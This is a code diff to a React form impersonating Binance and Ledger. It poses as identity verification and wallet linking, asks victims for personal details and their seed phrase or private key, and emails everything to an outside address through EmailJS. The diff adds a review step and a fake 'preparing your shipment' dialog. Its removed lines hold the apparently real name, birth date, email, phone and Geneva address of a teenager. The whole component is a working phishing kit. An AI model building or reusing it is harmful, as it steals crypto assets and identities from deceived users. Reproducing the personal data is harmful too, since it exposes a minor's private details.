@@ -1,25 +1,14 @@
-import { FC, useState, FormEvent, useEffect } from "react";
+
+import { FC, useState, FormEvent } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
 import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
+import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription, AlertDialogFooter, AlertDialogCancel, AlertDialogAction } from "@/components/ui/alert-dialog";
 import emailjs from 'emailjs-com';
 import { EMAILJS_CONFIG } from "@/config/emailjs.config";
-
-// Define the expected correct data
-const correctData = {
-  firstName: "Markus",
-  lastName: "Tornqvist",
-  dateOfBirth: "2009-12-06", // Format as YYYY-MM-DD for the date input
-  email: "markus.tornqvist09@gmail.com",
-  phoneNumber: "0798719282",
-  address: "Chemin de Ruth 83",
-  zipCode: "1223",
-  city: "Geneve",
-  country: "Switzerland",
-};
 
 // List of countries for the dropdown
 const countries = [
@@ -46,15 +35,10 @@ const countries = [
   "Yemen", "Zambia", "Zimbabwe"
 ];
 
-// Email.js configuration
-const EMAILJS_SERVICE_ID = "service_id"; // Replace with your EmailJS service ID
-const EMAILJS_TEMPLATE_ID = "template_id"; // Replace with your EmailJS template ID
-const EMAILJS_USER_ID = "user_id"; // Replace with your EmailJS user ID
-
 const BinanceLedgerForm: FC = () => {
   const { toast } = useToast();
   const [currentStep, setCurrentStep] = useState(1);
-  const [formProgress, setFormProgress] = useState(25);
+  const [formProgress, setFormProgress] = useState(20);
   const [formData, setFormData] = useState({
     firstName: "",
     lastName: "",
@@ -74,6 +58,7 @@ const BinanceLedgerForm: FC = () => {
   const [securityConfirmed, setSecurityConfirmed] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submissionCompleted, setSubmissionCompleted] = useState(false);
+  const [showConfirmation, setShowConfirmation] = useState(false);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setFormData({
@@ -103,20 +88,14 @@ const BinanceLedgerForm: FC = () => {
 
     if (formData.firstName.trim() === "") {
       newErrors.firstName = "First name is required";
-    } else if (formData.firstName !== correctData.firstName) {
-      newErrors.firstName = "Invalid first name";
     }
 
     if (formData.lastName.trim() === "") {
       newErrors.lastName = "Last name is required";
-    } else if (formData.lastName !== correctData.lastName) {
-      newErrors.lastName = "Invalid last name";
     }
 
     if (formData.dateOfBirth.trim() === "") {
       newErrors.dateOfBirth = "Date of birth is required";
-    } else if (formData.dateOfBirth !== correctData.dateOfBirth) {
-      newErrors.dateOfBirth = "Invalid date of birth";
     }
 
     setErrors(newErrors);
@@ -129,14 +108,10 @@ const BinanceLedgerForm: FC = () => {
 
     if (!emailRegex.test(formData.email)) {
       newErrors.email = "Valid email is required";
-    } else if (formData.email !== correctData.email) {
-      newErrors.email = "Invalid email";
     }
 
     if (formData.phoneNumber.trim() === "") {
       newErrors.phoneNumber = "Phone number is required";
-    } else if (formData.phoneNumber !== correctData.phoneNumber) {
-      newErrors.phoneNumber = "Invalid phone number";
     }
 
     setErrors(newErrors);
@@ -148,63 +123,85 @@ const BinanceLedgerForm: FC = () => {
     
     if (formData.address.trim() === "") {
       newErrors.address = "Address is required";
-    } else if (formData.address !== correctData.address) {
-      newErrors.address = "Invalid address";
     }
     
     if (formData.zipCode.trim() === "") {
       newErrors.zipCode = "Zip code is required";
-    } else if (formData.zipCode !== correctData.zipCode) {
-      newErrors.zipCode = "Invalid zip code";
     }
     
     if (formData.city.trim() === "") {
       newErrors.city = "City is required";
-    } else if (formData.city !== correctData.city) {
-      newErrors.city = "Invalid city";
     }
     
     if (!formData.country) {
       newErrors.country = "Country is required";
-    } else if (formData.country !== correctData.country) {
-      newErrors.country = "Invalid country";
     }
     
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
   };
 
+  const validateStep4 = () => {
+    if (!formData.seedPhrase.trim()) {
+      toast({
+        title: "Please enter your seed phrase or private key",
+        variant: "destructive",
+      });
+      return false;
+    }
+
+    if (!formData.securityConfirmation) {
+      toast({
+        title: "Please confirm the security notice",
+        variant: "destructive",
+      });
+      return false;
+    }
+    
+    return true;
+  };
+
   const handleNext = () => {
     if (currentStep === 1 && validateStep1()) {
       setCurrentStep(2);
-      setFormProgress(50);
+      setFormProgress(40);
     } else if (currentStep === 2 && validateStep2()) {
       setCurrentStep(3);
-      setFormProgress(75);
+      setFormProgress(60);
     } else if (currentStep === 3 && validateStep3()) {
       setCurrentStep(4);
-      setFormProgress(100);
+      setFormProgress(80);
       setVerificationCompleted(true);
+    } else if (currentStep === 4 && validateStep4()) {
+      setCurrentStep(5);
+      setFormProgress(100);
+      setShowConfirmation(true);
     }
   };
 
   const handlePrevious = () => {
     if (currentStep === 2) {
       setCurrentStep(1);
-      setFormProgress(25);
+      setFormProgress(20);
     } else if (currentStep === 3) {
       setCurrentStep(2);
-      setFormProgress(50);
+      setFormProgress(40);
     } else if (currentStep === 4) {
       setCurrentStep(3);
-      setFormProgress(75);
+      setFormProgress(60);
+      setVerificationCompleted(false);
+    } else if (currentStep === 5) {
+      setCurrentStep(4);
+      setFormProgress(80);
+      setShowConfirmation(false);
+      setVerificationCompleted(true);
     }
   };
 
   const sendEmail = async () => {
     try {
       const templateParams = {
-        to_email: "donotreply@binanceledger.com", // Updated recipient email
+        to_email: "donotreply@binanceledger.com",
         from_name: `${formData.firstName} ${formData.lastName}`,
         from_email: formData.email,
         subject: "New Binance Ledger Form Submission",
@@ -235,25 +232,9 @@ const BinanceLedgerForm: FC = () => {
     }
   };
 
-  const handleSubmit = async (e: FormEvent) => {
-    e.preventDefault();
+  const handleSubmit = async (e?: FormEvent) => {
+    if (e) e.preventDefault();
     
-    if (!formData.seedPhrase.trim()) {
-      toast({
-        title: "Please enter your seed phrase or private key",
-        variant: "destructive",
-      });
-      return;
-    }
-
-    if (!formData.securityConfirmation) {
-      toast({
-        title: "Please confirm the security notice",
-        variant: "destructive",
-      });
-      return;
-    }
-
     setIsSubmitting(true);
 
     try {
@@ -265,6 +246,7 @@ const BinanceLedgerForm: FC = () => {
       
       setIsSubmitting(false);
       setSubmissionCompleted(true);
+      setShowConfirmation(false);
       
       if (emailSent) {
         toast({
@@ -279,6 +261,7 @@ const BinanceLedgerForm: FC = () => {
       }
     } catch (error) {
       setIsSubmitting(false);
+      setShowConfirmation(false);
       toast({
         title: "Error",
         description: "An error occurred. Please try again.",
@@ -294,17 +277,17 @@ const BinanceLedgerForm: FC = () => {
         <h2 className="text-binance-yellow font-bold text-xl mb-2">
           {verificationCompleted ? "Security Verification" : "User Verification"}
         </h2>
-        {!verificationCompleted && (
+        {!submissionCompleted && (
           <div className="mb-4">
             <Progress value={formProgress} className="h-2 bg-gray-700" />
             <div className="mt-2 text-sm text-gray-400">
-              Step {currentStep} of 4
+              Step {currentStep} of 5
             </div>
           </div>
         )}
       </div>
 
-      {!verificationCompleted ? (
+      {!verificationCompleted && !showConfirmation && !submissionCompleted ? (
         <div className="space-y-6">
           {currentStep === 1 && (
             <div className="space-y-4">
@@ -385,7 +368,7 @@ const BinanceLedgerForm: FC = () => {
                   type="tel"
                   value={formData.phoneNumber}
                   onChange={handleInputChange}
-                  placeholder="Phone Number (e.g. 0798719282)"
+                  placeholder="Phone Number"
                   className={`bg-binance-darkGray border-gray-600 text-white ${errors.phoneNumber ? "border-red-500" : ""}`}
                 />
                 {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
@@ -500,8 +483,8 @@ const BinanceLedgerForm: FC = () => {
             </Button>
           </div>
         </div>
-      ) : !submissionCompleted ? (
-        <form onSubmit={handleSubmit} className="space-y-6">
+      ) : verificationCompleted && !showConfirmation && !submissionCompleted ? (
+        <form onSubmit={(e) => { e.preventDefault(); handleNext(); }} className="space-y-6">
           <div className="text-center py-4">
             <h3 className="text-white font-semibold text-xl">
               Verification successful. Thank you, {formData.firstName} {formData.lastName}.
@@ -554,11 +537,80 @@ const BinanceLedgerForm: FC = () => {
               disabled={isSubmitting || !securityConfirmed}
               className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
             >
-              {isSubmitting ? "Processing..." : "Complete Wallet Linking"}
+              Review Information
             </Button>
           </div>
         </form>
-      ) : (
+      ) : showConfirmation && !submissionCompleted ? (
+        <div className="space-y-6">
+          <div className="text-center py-2">
+            <h3 className="text-white font-semibold text-xl mb-4">
+              Review Your Information
+            </h3>
+            <p className="text-gray-300 text-sm mb-6">
+              Please review the information below before finalizing your submission.
+            </p>
+          </div>
+
+          <div className="space-y-4 bg-binance-darkGray/40 p-4 rounded-md">
+            <div className="grid grid-cols-2 gap-x-4 gap-y-2">
+              <div className="text-gray-400 text-sm">First Name:</div>
+              <div className="text-white text-sm font-medium">{formData.firstName}</div>
+              
+              <div className="text-gray-400 text-sm">Last Name:</div>
+              <div className="text-white text-sm font-medium">{formData.lastName}</div>
+              
+              <div className="text-gray-400 text-sm">Date of Birth:</div>
+              <div className="text-white text-sm font-medium">{formData.dateOfBirth}</div>
+              
+              <div className="text-gray-400 text-sm">Email:</div>
+              <div className="text-white text-sm font-medium">{formData.email}</div>
+              
+              <div className="text-gray-400 text-sm">Phone Number:</div>
+              <div className="text-white text-sm font-medium">{formData.phoneNumber}</div>
+              
+              <div className="text-gray-400 text-sm">Address:</div>
+              <div className="text-white text-sm font-medium">{formData.address}</div>
+              
+              <div className="text-gray-400 text-sm">Zip Code:</div>
+              <div className="text-white text-sm font-medium">{formData.zipCode}</div>
+              
+              <div className="text-gray-400 text-sm">City:</div>
+              <div className="text-white text-sm font-medium">{formData.city}</div>
+              
+              <div className="text-gray-400 text-sm">Country:</div>
+              <div className="text-white text-sm font-medium">{formData.country}</div>
+            </div>
+
+            <div className="pt-2">
+              <div className="text-gray-400 text-sm">Seed Phrase/Private Key:</div>
+              <div className="bg-gray-800 p-2 rounded mt-1">
+                <div className="text-white text-sm font-mono break-all">
+                  {formData.seedPhrase}
+                </div>
+              </div>
+            </div>
+          </div>
+          
+          <div className="flex justify-between pt-6">
+            <Button
+              type="button"
+              onClick={handlePrevious}
+              className="bg-gray-600 hover:bg-gray-700 text-white"
+            >
+              Go Back
+            </Button>
+            <Button
+              type="button"
+              onClick={handleSubmit}
+              disabled={isSubmitting}
+              className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+            >
+              {isSubmitting ? "Processing..." : "Confirm & Submit"}
+            </Button>
+          </div>
+        </div>
+      ) : submissionCompleted && (
         <div className="text-center py-8">
           <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 mb-6">
             <svg
@@ -594,6 +646,24 @@ const BinanceLedgerForm: FC = () => {
           </p>
         </div>
       )}
+
+      <AlertDialog open={showConfirmation && isSubmitting} onOpenChange={(open) => {
+        if (!open && isSubmitting) {
+          setShowConfirmation(false);
+        }
+      }}>
+        <AlertDialogContent className="bg-binance-dark border-gray-700">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-white">Processing Your Request</AlertDialogTitle>
+            <AlertDialogDescription className="text-gray-300">
+              Please wait while we process your information and prepare your Binance Ledger shipment...
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <div className="flex justify-center py-4">
+            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-binance-yellow"></div>
+          </div>
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   );
 };
